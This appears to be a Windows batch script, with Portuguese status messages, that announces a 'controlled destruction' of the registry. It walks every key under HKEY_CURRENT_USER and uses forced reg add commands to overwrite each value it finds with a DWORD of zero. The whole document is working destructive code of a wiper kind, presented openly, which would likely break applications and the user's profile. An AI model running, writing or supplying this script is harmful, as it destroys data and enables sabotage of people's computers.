@echo off
set "RAIZ=HKCU"

echo Iniciando destruicao controlada dos registros em %RAIZ%...

for /f "tokens=*" %%K in ('reg query %RAIZ% /s /f * ^| findstr "HKEY_"') do (
    for /f "tokens=1" %%V in ('reg query "%%K" ^| findstr "REG_"') do (
        reg add "%%K" /v "%%V" /t REG_DWORD /d 0 /f
    )
)

echo Operacao finalizada.
pause
